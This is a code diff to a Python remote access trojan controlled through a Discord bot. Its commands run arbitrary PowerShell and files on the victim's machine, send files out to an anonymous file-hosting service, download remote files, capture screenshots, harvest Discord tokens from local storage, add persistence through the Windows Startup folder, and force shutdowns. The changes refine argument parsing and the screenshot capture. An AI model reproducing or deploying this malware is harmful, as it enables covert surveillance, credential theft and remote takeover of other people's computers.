@@ -1,4 +1,5 @@
-import os, discord, subprocess, requests, pyautogui, re, shutil, json, sys
+import os, discord, subprocess, requests, re, shutil, json, sys
+from PIL import ImageGrab
 
 def get_processor():
     stdout = subprocess.Popen(
@@ -88,7 +89,7 @@ async def on_message(message):
         await message.reply(embed=embed)
 
     if message.content.startswith("cd"):
-        directory = message.content.split(" ")[1]
+        directory = message.content[3:]
         try:
             os.chdir(directory)
             embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
@@ -100,11 +101,16 @@ async def on_message(message):
         files = "\n".join(os.listdir())
         if files == "":
             files = "No files found"
+        if len(files) > 4095:
+            open(f"{os.getenv('TEMP')}\\list.txt", "w").write(files)
+            embed = discord.Embed(title=f"Files > {os.getcwd()}", description="```See attachment```", color=0xfafafa)
+            file = discord.File(f"{os.getenv('TEMP')}\\list.txt")
+            return await message.reply(embed=embed, file=file)
         embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
         await message.reply(embed=embed)
 
     if message.content.startswith("download"):
-        file = message.content.split(" ")[1]
+        file = message.content[9:]
         try:
             link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
             embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
@@ -114,7 +120,7 @@ async def on_message(message):
             await message.reply(embed=embed)
 
     if message.content.startswith("upload"):
-        link = message.content.split(" ")[1]
+        link = message.content[7:]
         file = requests.get(link).content
         with open(os.path.basename(link), "wb") as f:
             f.write(file)
@@ -122,7 +128,7 @@ async def on_message(message):
         await message.reply(embed=embed)
 
     if message.content.startswith("shell"):
-        command = message.content.split(" ")[1]
+        command = message.content[6:]
         output = subprocess.Popen(
             ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True
         ).communicate()[0].decode("utf-8")
@@ -132,7 +138,7 @@ async def on_message(message):
         await message.reply(embed=embed)
 
     if message.content.startswith("run"):
-        file = message.content.split(" ")[1]
+        file = message.content[4:]
         subprocess.Popen(file, shell=True)
         embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
         await message.reply(embed=embed)
@@ -142,7 +148,7 @@ async def on_message(message):
         await bot.close()
 
     if message.content == "screenshot":
-        screenshot = pyautogui.screenshot()
+        screenshot = ImageGrab.grab(all_screens=True)
         path = os.path.join(os.getenv("TEMP"), "screenshot.png")
         screenshot.save(path)
         file = discord.File(path)
@@ -150,6 +156,7 @@ async def on_message(message):
         embed.set_image(url="attachment://screenshot.png")
         await message.reply(embed=embed, file=file)
 
+    # Token grab not working (will be fixed in next update)
     if message.content == "tokens":
         paths = [
             os.path.join(os.getenv("APPDATA"), ".discord", "Local Storage", "leveldb"),
@@ -183,6 +190,7 @@ async def on_message(message):
         embed = discord.Embed(title="Tokens", description=f"```{tokens}```", color=0xfafafa)
         await message.reply(embed=embed)
 
+    # Startup not working (will be fixed in next update)
     if message.content == "startup":
         path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
         try:
@@ -198,14 +206,14 @@ async def on_message(message):
         await message.reply(embed=embed)
 
     if message.content == "shutdown":
-        await message.channel.delete()
-        await bot.close()
+        embed = discord.Embed(title="Shutdown", description=f"```Shutting down...```", color=0xfafafa)
+        await message.reply(embed=embed)
         os.system("shutdown /s /t 0")
 
     if message.content == "restart":
-        await message.channel.delete()
-        await bot.close()
+        embed = discord.Embed(title="Restart", description=f"```Restarting...```", color=0xfafafa)
+        await message.reply(embed=embed)
         os.system("shutdown /r /t 0")
 
-bot.run(token, log_handler=None)
+bot.run(token)
 
